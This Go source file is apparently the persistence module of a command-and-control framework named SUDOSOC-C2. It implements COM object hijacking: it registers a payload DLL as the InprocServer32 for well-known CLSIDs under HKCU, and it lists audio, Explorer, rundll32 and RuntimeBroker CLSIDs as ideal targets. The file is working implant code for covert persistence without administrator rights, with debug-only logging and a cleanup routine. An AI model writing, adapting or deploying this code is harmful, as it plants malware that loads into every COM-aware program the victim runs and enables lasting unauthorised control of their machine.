package persistence

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	COM Object Hijacking — HKCU registration, no admin required.

	When a COM-aware application calls CoCreateInstance(CLSID) Windows
	checks HKCU\Software\Classes\CLSID first, before HKLM. By registering
	a fake In-Process server (InprocServer32) pointing to our payload DLL
	under HKCU, we intercept every future COM activation of that CLSID —
	in any application running as the current user.

	Targets (commonly activated CLSIDs that load InprocServer32):
	  {BCDE0395-E52F-467C-8E3D-C4579291692E} — MMDeviceEnumerator (audio)
	  {9BA05972-F6A8-11CF-A442-00A0C90A8F39} — ShellWindows (Explorer)
	  {C08AFD90-F2A1-11D1-8455-00A0C91F3880} — ShellBrowserWindow
	  {9E56BE60-C50F-11CF-9A2C-00A0C90A90CE} — SendToMenu
	  {ADB880A6-D8FF-11CF-9377-00AA003B7A11} — RunDLL32 shell (rundll32)
*/

import (
	"fmt"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows/registry"
)

// COMHijackEntry maps a CLSID to a payload DLL path.
type COMHijackEntry struct {
	CLSID       string // e.g. "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
	DLLPath     string // full path to the payload DLL
	ThreadModel string // "Both", "Apartment" (default "Both")
}

// WellKnownTargets returns CLSIDs that are commonly activated in the
// Windows shell and Office suite — ideal hijack targets.
func WellKnownTargets() []string {
	return []string{
		"{BCDE0395-E52F-467C-8E3D-C4579291692E}", // MMDeviceEnumerator
		"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}", // ShellWindows
		"{C08AFD90-F2A1-11D1-8455-00A0C91F3880}", // ShellBrowserWindow
		"{ADB880A6-D8FF-11CF-9377-00AA003B7A11}", // RunDLL32 (shell ext)
		"{D63B10C5-BB46-4990-A94F-E40B9D520160}", // RuntimeBroker
	}
}

// InstallCOMHijack registers entry.DLLPath as the InprocServer32 for
// entry.CLSID under HKCU — no administrator required.
func InstallCOMHijack(entry COMHijackEntry) error {
	if entry.ThreadModel == "" {
		entry.ThreadModel = "Both"
	}

	keyPath := `Software\Classes\CLSID\` + entry.CLSID + `\InprocServer32`
	k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath,
		registry.SET_VALUE|registry.CREATE_SUB_KEY)
	if err != nil {
		return fmt.Errorf("CreateKey HKCU\\%s: %w", keyPath, err)
	}
	defer k.Close()

	if err := k.SetStringValue("", entry.DLLPath); err != nil {
		return fmt.Errorf("set default value: %w", err)
	}
	if err := k.SetStringValue("ThreadingModel", entry.ThreadModel); err != nil {
		return fmt.Errorf("set ThreadingModel: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[com] hijacked CLSID %s → %s", entry.CLSID, entry.DLLPath)
	// {{end}}
	return nil
}

// RemoveCOMHijack deletes the HKCU registration for clsid.
func RemoveCOMHijack(clsid string) error {
	keyPath := `Software\Classes\CLSID\` + clsid
	if err := registry.DeleteKey(registry.CURRENT_USER,
		keyPath+`\InprocServer32`); err != nil {
		return fmt.Errorf("DeleteKey InprocServer32: %w", err)
	}
	_ = registry.DeleteKey(registry.CURRENT_USER, keyPath)
	// {{if .Config.Debug}}
	log.Printf("[com] removed hijack for CLSID %s", clsid)
	// {{end}}
	return nil
}
